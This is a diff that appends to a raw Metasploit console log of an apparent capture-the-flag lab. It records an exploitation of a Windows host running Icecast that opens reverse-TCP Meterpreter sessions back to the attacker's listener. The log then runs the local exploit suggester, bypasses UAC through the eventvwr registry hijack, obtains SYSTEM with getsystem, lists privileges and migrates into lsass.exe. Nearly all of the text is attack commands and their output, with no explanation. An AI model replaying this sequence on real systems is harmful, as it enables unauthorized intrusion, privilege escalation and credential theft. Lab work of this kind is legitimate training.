@@ -1881,4 +1881,503 @@ Exploit target:
 [0m[4mmeterpreter[0m > 
 [0m[4mmeterpreter[0m > ls
 [0m[1m[31m[-][0m Error running command ls: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > shell
+[0m[1m[31m[-][0m Error running command shell: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.169.236 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m>  [K [Krun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.225.145:4444 
+[1m[34m[*][0m Sending stage (180291 bytes) to 10.10.169.236
+[1m[34m[*][0m Meterpreter session 2 opened (10.10.225.145:4444 -> 10.10.169.236:49453) at 2020-04-26 18:04:33 +0000
+
+[0m[4mmeterpreter[0m > [0m[0mshe[K[K[Krunsessions [P[P[P[P[Pexitshell[P[P[Plsshell[K[Kls
+[0mListing: C:\Program Files (x86)\Icecast2 Win32
+==============================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100777/rwxrwxrwx  512000  fil   2004-01-08 14:26:45 +0000  Icecast2.exe
+40777/rwxrwxrwx   4096    dir   2019-11-12 23:04:09 +0000  admin
+40777/rwxrwxrwx   0       dir   2019-11-12 23:04:09 +0000  doc
+100666/rw-rw-rw-  3663    fil   2004-01-08 14:25:30 +0000  icecast.xml
+100777/rwxrwxrwx  253952  fil   2004-01-08 14:27:09 +0000  icecast2console.exe
+100666/rw-rw-rw-  872448  fil   2002-06-28 01:11:54 +0000  iconv.dll
+100666/rw-rw-rw-  188477  fil   2003-04-13 03:29:12 +0000  libcurl.dll
+100666/rw-rw-rw-  631296  fil   2002-07-11 02:09:00 +0000  libxml2.dll
+100666/rw-rw-rw-  128000  fil   2002-07-11 02:11:54 +0000  libxslt.dll
+40777/rwxrwxrwx   0       dir   2019-11-12 23:04:09 +0000  logs
+100666/rw-rw-rw-  53299   fil   2002-03-23 14:48:14 +0000  pthreadVSE.dll
+100666/rw-rw-rw-  2380    fil   2019-11-12 23:04:09 +0000  unins000.dat
+100777/rwxrwxrwx  71588   fil   2003-04-14 08:00:00 +0000  unins000.exe
+40777/rwxrwxrwx   0       dir   2019-11-12 23:04:09 +0000  web
+
+[4mmeterpreter[0m > lsrunsessions [P[P[P[P[Pexitshell[P[P[Plsshell[Khellrun post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pset exitonsession false[C[C[C[C[C[C[C[C[C[C[C[C[C[Crun post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
+[0m
+[1m[34m[*][0m 10.10.169.236 - Collecting local exploits for x86/windows...
+[1m[34m[*][0m 10.10.169.236 - 29 exploit checks are being tried...
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+  This module will bypass Windows UAC by hijacking a special key in 
+  the Registry under the current user hive, and inserting a custom 
+  command that will get invoked when the Windows Event Viewer is 
+  launched. It will spawn a second shell that has the UAC flag turned 
+  off. This module modifies a registry key, but cleans up the key once 
+  the payload has been invoked. The module does not require the 
+  architecture of the payload to match the OS. If specifying 
+  EXE::Custom your DLL should call ExitProcess() after starting your 
+  payload in a separate process.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+  This module exploits a missing DLL loaded by the 'IKE and AuthIP 
+  Keyring Modules' (IKEEXT) service which runs as SYSTEM, and starts 
+  automatically in default installations of Vista-Win8. It requires an 
+  insecure bin path to plant the DLL payload.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+  This module exploits the Task Scheduler 2.0 XML 0day exploited by 
+  Stuxnet. When processing task files, the Windows Task Scheduler only 
+  uses a CRC32 checksum to validate that the file has not been 
+  tampered with. Also, In a default configuration, normal users can 
+  read and write the task files that they have created. By modifying 
+  the task file and creating a CRC32 collision, an attacker can 
+  execute arbitrary commands with SYSTEM privileges. NOTE: Thanks to 
+  webDEViL for the information about disable/enable.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+  This module leverages a kernel pool overflow in Win32k which allows 
+  local privilege escalation. The kernel shellcode nulls the ACL for 
+  the winlogon.exe process (a SYSTEM process). This allows any 
+  unprivileged process to freely migrate to winlogon.exe, achieving 
+  privilege escalation. This exploit was used in pwn2own 2013 by MWR 
+  to break out of chrome's sandbox. NOTE: when a meterpreter session 
+  started by this exploit exits, winlogin.exe is likely to crash.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+  This module exploits a vulnerability in win32k.sys where under 
+  specific conditions TrackPopupMenuEx will pass a NULL pointer to the 
+  MNEndMenuState procedure. This module has been tested successfully 
+  on Windows 7 SP0 and Windows 7 SP1.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+  This module exploits a NULL Pointer Dereference in win32k.sys, the 
+  vulnerability can be triggered through the use of TrackPopupMenu. 
+  Under special conditions, the NULL pointer dereference can be abused 
+  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
+  module has been tested successfully on Windows XP SP3, Windows 2003 
+  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
+  and Windows 2008 R2 SP1 64 bits.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+  This module exploits improper object handling in the win32k.sys 
+  kernel mode driver. This module has been tested on vulnerable builds 
+  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+  This module exploits the lack of sanitization of standard handles in 
+  Windows' Secondary Logon Service. The vulnerability is known to 
+  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
+  module will only work against those versions of Windows with 
+  Powershell 2.0 or later and systems with two or more CPU cores.
+[1m[32m[+][0m 10.10.169.236 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
+  to the usage of uninitialized data which allows to corrupt memory. 
+  At the moment, the module has been tested successfully on Windows XP 
+  SP3, Windows 2003 SP1, and Windows 7 SP1.
+[4mmeterpreter[0m > background 
+[0m[1m[34m[*][0m Backgrounding session 2...
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> ls[K[K [Kuse background run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Krunsessions [P[P[P[P[Pexitshell[P[P[Plsshell[P[P[Plsshell[Pexitsessions [P[P[P[P[P[Prun[Plsrunsessions [P[P[P[P[Pexitshell
+[0mInterrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m>  [K [Kuse exploit/windows/local/bypassuac_eventvwr
+[0m[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> show options 
+[0m
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m>  [K [Kset session +[K0[K[K[K[K[K[K[K[K[K[K[K[K[Ksessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.10.225.145:4444 -> 10.10.169.236:49453 (10.10.169.236)
+
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> set sessions[K 2
+[0msession => 2
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> show options 
+[0m
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  2                yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m>  [K [K [K [K [K [K [K [K [K [K [K [K [K [K [K [Kset gl[K[K[K[Kg [K[Ktg lhost [K[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> setg lhost [K[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> setg lhost 34-.[K[K.245.220.134
+[0mlhost => 34.245.220.134
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> s[Kshow options 
+[0m
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  2                yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m>  [K [K [K [K [K [K [K [K [K [Krun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.225.145:4444 
+[1m[34m[*][0m UAC is Enabled, checking level...
+[1m[32m[+][0m Part of Administrators group! Continuing...
+[1m[32m[+][0m UAC is set to Default
+[1m[32m[+][0m BypassUAC can bypass this setting, continuing...
+[1m[34m[*][0m Configuring payload and stager registry keys ...
+[1m[34m[*][0m Executing payload: C:\Windows\SysWOW64\eventvwr.exe
+[1m[32m[+][0m eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
+[1m[34m[*][0m Sending stage (180291 bytes) to 10.10.169.236
+[1m[34m[*][0m Meterpreter session 3 opened (10.10.225.145:4444 -> 10.10.169.236:49468) at 2020-04-26 18:19:17 +0000
+[0m[1m[34m[*][0m Sending stage (180291 bytes) to 10.10.169.236
+[1m[34m[*][0m Meterpreter session 4 opened (10.10.225.145:4444 -> 10.10.169.236:49422) at 2020-04-26 18:19:23 +0000
+[0m[1m[34m[*][0m Cleaning up registry keys ...
+
+[0m[4mmeterpreter[0m > [0m[0mps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User          Path
+ ---   ----  ----                  ----  -------  ----          ----
+ 0     0     [System Process]                                   
+ 4     0     System                                             
+ 416   4     smss.exe                                           
+ 544   536   csrss.exe                                          
+ 584   692   svchost.exe                                        
+ 592   536   wininit.exe                                        
+ 604   584   csrss.exe                                          
+ 652   584   winlogon.exe                                       
+ 692   592   services.exe                                       
+ 700   592   lsass.exe                                          
+ 708   592   lsm.exe                                            
+ 816   692   svchost.exe                                        
+ 884   692   svchost.exe                                        
+ 904   692   sppsvc.exe                                         
+ 932   692   svchost.exe                                        
+ 1020  692   svchost.exe                                        
+ 1060  692   svchost.exe                                        
+ 1188  692   svchost.exe                                        
+ 1216  816   WmiPrvSE.exe                                       
+ 1296  1020  dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
+ 1316  1288  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
+ 1368  692   spoolsv.exe                                        
+ 1396  692   svchost.exe                                        
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
+ 1540  692   amazon-ssm-agent.exe                               
+ 1636  692   LiteAgent.exe                                      
+ 1676  692   svchost.exe                                        
+ 1800  604   conhost.exe           x64   1                      
+ 1816  692   Ec2Config.exe                                      
+ 1864  692   svchost.exe                                        
+ 1980  692   TrustedInstaller.exe                               
+ 2260  1316  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2348  692   vds.exe                                            
+ 2548  816   slui.exe              x64   1        Dark-PC\Dark  C:\Windows\System32\slui.exe
+ 2584  692   SearchIndexer.exe                                  
+ 2756  360   powershell.exe        x86   1                      
+
+[4mmeterpreter[0m >  [K [K [K [Kbackground 
+[0m[1m[34m[*][0m Backgrounding session 4...
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> sessions -u [K[K[K[K
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.10.225.145:4444 -> 10.10.169.236:49453 (10.10.169.236)
+  3         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.10.225.145:4444 -> 10.10.169.236:49468 (10.10.169.236)
+  4         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.10.225.145:4444 -> 10.10.169.236:49422 (10.10.169.236)
+
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> sessions - [K [Ku 4
+[0m[1m[34m[*][0m Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [4]
+
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 4
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[31m[-][0m Handler failed to bind to 34.245.220.134:4433:-  -
+[1m[31m[-][0m Handler failed to bind to 0.0.0.0:4433:-  -
+[1m[31m[-][0m Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4433).
+[1m[31m[-][0m Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
+[1m[31m[-][0m Call stack:
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:166:in `execute'
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:114:in `cmd_exec'
+[1m[31m[-][0m   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:164:in `run'
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m>  [K [Ksessions -u 3
+[0m[1m[34m[*][0m Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3]
+
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 3
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[31m[-][0m Handler failed to bind to 34.245.220.134:4433:-  -
+[1m[31m[-][0m Handler failed to bind to 0.0.0.0:4433:-  -
+[1m[31m[-][0m Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4433).
+[1m[31m[-][0m Post interrupted by the console user
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m>  [K [K [K [Ksessions 4
+[0m[1m[34m[*][0m Starting interaction with 4...
+
+[4mmeterpreter[0m > ls
+[0mListing: C:\Program Files (x86)\Icecast2 Win32
+==============================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100777/rwxrwxrwx  512000  fil   2004-01-08 14:26:45 +0000  Icecast2.exe
+40777/rwxrwxrwx   4096    dir   2019-11-12 23:04:09 +0000  admin
+40777/rwxrwxrwx   0       dir   2019-11-12 23:04:09 +0000  doc
+100666/rw-rw-rw-  3663    fil   2004-01-08 14:25:30 +0000  icecast.xml
+100777/rwxrwxrwx  253952  fil   2004-01-08 14:27:09 +0000  icecast2console.exe
+100666/rw-rw-rw-  872448  fil   2002-06-28 01:11:54 +0000  iconv.dll
+100666/rw-rw-rw-  188477  fil   2003-04-13 03:29:12 +0000  libcurl.dll
+100666/rw-rw-rw-  631296  fil   2002-07-11 02:09:00 +0000  libxml2.dll
+100666/rw-rw-rw-  128000  fil   2002-07-11 02:11:54 +0000  libxslt.dll
+40777/rwxrwxrwx   0       dir   2019-11-12 23:04:09 +0000  logs
+100666/rw-rw-rw-  53299   fil   2002-03-23 14:48:14 +0000  pthreadVSE.dll
+100666/rw-rw-rw-  2380    fil   2019-11-12 23:04:09 +0000  unins000.dat
+100777/rwxrwxrwx  71588   fil   2003-04-14 08:00:00 +0000  unins000.exe
+40777/rwxrwxrwx   0       dir   2019-11-12 23:04:09 +0000  web
+
+[4mmeterpreter[0m >  [K [K [K [K [Kps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User          Path
+ ---   ----  ----                  ----  -------  ----          ----
+ 0     0     [System Process]                                   
+ 4     0     System                                             
+ 416   4     smss.exe                                           
+ 544   536   csrss.exe                                          
+ 584   692   svchost.exe                                        
+ 592   536   wininit.exe                                        
+ 604   584   csrss.exe                                          
+ 652   584   winlogon.exe                                       
+ 692   592   services.exe                                       
+ 700   592   lsass.exe                                          
+ 708   592   lsm.exe                                            
+ 816   692   svchost.exe                                        
+ 884   692   svchost.exe                                        
+ 904   692   sppsvc.exe                                         
+ 932   692   svchost.exe                                        
+ 1020  692   svchost.exe                                        
+ 1060  692   svchost.exe                                        
+ 1188  692   svchost.exe                                        
+ 1216  816   WmiPrvSE.exe                                       
+ 1296  1020  dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
+ 1316  1288  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
+ 1368  692   spoolsv.exe                                        
+ 1396  692   svchost.exe                                        
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
+ 1540  692   amazon-ssm-agent.exe                               
+ 1636  692   LiteAgent.exe                                      
+ 1676  692   svchost.exe                                        
+ 1800  604   conhost.exe           x64   1                      
+ 1816  692   Ec2Config.exe                                      
+ 1864  692   svchost.exe                                        
+ 1980  692   TrustedInstaller.exe                               
+ 2260  1316  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2348  692   vds.exe                                            
+ 2548  816   slui.exe              x64   1        Dark-PC\Dark  C:\Windows\System32\slui.exe
+ 2584  692   SearchIndexer.exe                                  
+ 2756  360   powershell.exe        x86   1                      
+
+[4mmeterpreter[0m >  [K [Kgetpid
+[0mCurrent pid: 2260
+[4mmeterpreter[0m > background 
+[0m[1m[34m[*][0m Backgrounding session 4...
+[4mmsf5[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> sessions 3
+[0m[1m[34m[*][0m Starting interaction with 3...
+
+[4mmeterpreter[0m > getpid
+[0mCurrent pid: 2756
+[4mmeterpreter[0m >  [K [Kback[K[K[K[Kbackground [K[K[K[K[K[K[K[K[K[K[Kgetsystem
+[0m...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+[4mmeterpreter[0m >  [K [K [Kgetprivs
+[0m
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
+ 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 584   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
+ 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
+ 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
+ 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 904   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
+ 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1188  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1216  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
+ 1296  1020  dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
+ 1316  1288  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
+ 1368  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1396  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
+ 1540  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1636  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
+ 1676  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1800  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
+ 1816  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1864  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1980  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+ 2260  1316  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2348  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
+ 2548  816   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
+ 2584  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
+ 2756  360   powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
+
+[4mmeterpreter[0m > ps | lsass
+[0mFiltering on 'lsass'
+
+Process List
+============
+
+ PID  PPID  Name       Arch  Session  User                 Path
+ ---  ----  ----       ----  -------  ----                 ----
+ 700  592   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
+
+[4mmeterpreter[0m >  [K [Kps la[Ksass
+[0mFiltering on 'lsass'
+
+Process List
+============
+
+ PID  PPID  Name       Arch  Session  User                 Path
+ ---  ----  ----       ----  -------  ----                 ----
+ 700  592   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
+
+[4mmeterpreter[0m >  [K [Kmigrate 700
+[0m[1m[34m[*][0m Migrating from 2756 to 700...
+[1m[34m[*][0m Migration completed successfully.
+[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 584   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 904   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
+ 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1188  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1216  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
+ 1296  1020  dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\system32\Dwm.exe
+ 1316  1288  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\Explorer.EXE
+ 1368  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1396  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\system32\taskhost.exe
+ 1540  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1636  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1676  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1816  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1864  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1980  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+ 2260  1316  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2348  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
+ 2548  816   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
+ 2584  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+
+[4mmeterpreter[0m >  [K [K[K[4mmeterpreter[0m > [K[4mmeterpreter[0m > ps spool
+[0mFiltering on 'spool'
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User                 Path
+ ---   ----  ----         ----  -------  ----                 ----
+ 1368  692   spoolsv.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\spoolsv.exe
+
+[4mmeterpreter[0m >  [K [K [Kgetuid
+[0mServer username: NT AUTHORITY\SYSTEM
 [4mmeterpreter[0m > 
